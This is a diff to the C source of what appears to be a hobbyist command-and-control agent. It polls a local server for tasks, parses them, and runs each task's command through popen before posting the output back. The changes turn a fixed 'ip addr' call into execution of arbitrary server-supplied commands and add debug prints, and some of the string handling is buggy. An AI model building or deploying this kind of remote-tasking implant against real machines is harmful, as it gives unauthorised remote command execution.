@@ -54,6 +54,9 @@ bool reg(struct agent_info *agent, struct strings_array *sa)
 	// struct strings_array chunk = {.response = NULL, .size = 0};
 	struct web_comms web = {NULL, 0, NULL};
 
+	// sa->response = malloc(0);
+	// sa->size = 0;
+
 	if (!curl_prep(&web))
 	{
 		perror("curl_prep failed\n");
@@ -134,47 +137,56 @@ bool check_tasks(struct agent_info *agent, struct strings_array *sa)
 {
     struct web_comms web = {NULL, 0, NULL};
 
+	// sa->response = malloc(0);
+	// sa->size = 0;
+
     if (!curl_prep(&web))
     {
         perror("curl_prep failed\n");
-        exit(1);
+        return false;
     }
+	puts("made it past curl prep\n");
+	if(!agent->got_tasks_url) {
+		puts("Made it pas if got tasks\n");
+		char tasks_url[64] = "127.0.0.1:9000/tasks/";
+		strncat(tasks_url, agent->uuid, strlen(agent->uuid));
+		strncpy(agent->tasks_url, tasks_url, strlen(tasks_url) +1);
+		printf("Tasks URL is: %s", agent->tasks_url);
+		agent->got_tasks_url = true;
+	}
 
-	char tasks_url[64] = "127.0.0.1:9000/tasks/";
-	strncat(tasks_url, agent->uuid, strlen(agent->uuid));
-	printf("Tasks URL is: %s", tasks_url);
-
-
-
-	curl_easy_setopt(web.curl, CURLOPT_URL, tasks_url);
+	curl_easy_setopt(web.curl, CURLOPT_URL, agent->tasks_url);
 
 	// This line below specifies what to do with the data when we receive it,
 	// as opposed to printing it to stdout. We will pass in a ptr to our own function
 	// called got_data in this example. This is known as a call back function.
 	// Send data to this function as opposed to writing to stdout.
+	puts("Made it to mem_cb call in curl_easy_setop\n");
 	curl_easy_setopt(web.curl, CURLOPT_WRITEFUNCTION, mem_cb);
-
+	puts("Made it out of mem_cb call in curl_easy_setop\n");
 	// Pass sa object to callback function.
 	curl_easy_setopt(web.curl, CURLOPT_WRITEDATA, (void *)sa);
+	puts("made it out of curl_easy_setopt WRITEDATA\n");
 
 	CURLcode result = curl_easy_perform(web.curl);
-
+	puts("made it past curl_easy_perform\n");
 	printf("The data returning from check tasks is %s\n\n", sa->response);
 
 	if (result != CURLE_OK)
 	{
 		fprintf(stderr, "download problem: %s\n",
 				curl_easy_strerror(result));
+				return false;
 	}
 
 	curl_easy_cleanup(web.curl);
-	return 0;
+	return true;
 }
 
 // Executes a given task.
 // ref: https://www.linuxquestions.org/questions/linux-newbie-8/
 // help-in-getting-return-status-of-popen-sys-call-870219/
-bool run_cmd(struct strings_array *sa)
+bool run_cmd(struct strings_array *sa, struct tasks *task)
 {
 	// Allocates space for array to a size of cap (1) * size of char, as size
 	// of file is unknown. When memory runs out realloc() will allocate
@@ -185,7 +197,16 @@ bool run_cmd(struct strings_array *sa)
 	int cmd_ret = 0;
 	size_t cur_len = 0;
 
-	if ((cmd_fptr = popen("ip addr", "r")) != NULL)
+	// char tasks_url[64] = "127.0.0.1:9000/tasks/";
+	// strncat(tasks_url, agent->uuid, strlen(agent->uuid));
+
+	char space[1] = " ";
+	strncat(task->cmd, space, sizeof(1));
+	strncat(task->cmd, task->args, strlen(task->args));
+
+	printf("Task->cmd after concat is: %s", task->cmd);
+
+	if ((cmd_fptr = popen(task->cmd, "r")) != NULL)
 	{
 		while (fgets(line, sizeof(line), cmd_fptr) != NULL)
 		{
@@ -258,7 +279,7 @@ bool post_results(struct strings_array *sa)
 
 	// Always cleanup.
 	curl_easy_cleanup(web.curl);
-
+	
 	free(chunk.response);
 
 	// Then cleanup the form.
@@ -270,9 +291,7 @@ bool post_results(struct strings_array *sa)
 bool parse_tasks(char *response, struct tasks *task)
 {
 	char line[1024] = { '\0' };
-	puts("before char_to_file\n");
 	FILE *response_file = char_to_file(response);
-	puts("after char_to_file\n");
 
 	task->strings = malloc((task->cap) * sizeof(*task->strings));
 	if (!task->strings) {
@@ -280,6 +299,7 @@ bool parse_tasks(char *response, struct tasks *task)
 		return 1;
 	}
 	int count = 0;
+    memset(line, 0, sizeof(line));
 // While loop reads each line FILE *word_source (file(s) or stdin).
 	while (fgets(line, sizeof(line), response_file) != NULL) {
 		++count;
@@ -314,6 +334,7 @@ bool parse_tasks(char *response, struct tasks *task)
 			strncpy(task->strings[task->sz], line + 1, len);
 			task->sz++;
 		}
+
 		// strncpy(task->strings[task->sz], line, len);
 		// task->sz++;
 
@@ -322,13 +343,15 @@ bool parse_tasks(char *response, struct tasks *task)
 			puts("hit break statment\n");
 			break;
 		}
+    	memset(line, 0, sizeof(line));
 
 	}
 	puts("********PARSED TASKS*************************");
 	for (unsigned int i = 0; i < task->sz; i++) {
 		printf("%s\n", task->strings[i]);
 	}
-	// fclose(sa->word_source);
+	fclose(response_file);
+	return true;
 }
 
 void destroy(struct tasks *task)
@@ -346,6 +369,7 @@ void destroy(struct tasks *task)
 }
 
 //ref https://stackoverflow.com/questions/52974572/cast-char-to-file-without-saving-the-file
+// converts char* to file*.
 FILE *char_to_file(char *data) {
 
     int len;
@@ -372,3 +396,4 @@ FILE *char_to_file(char *data) {
 
     return fdopen(p[0], "r");
 }
+
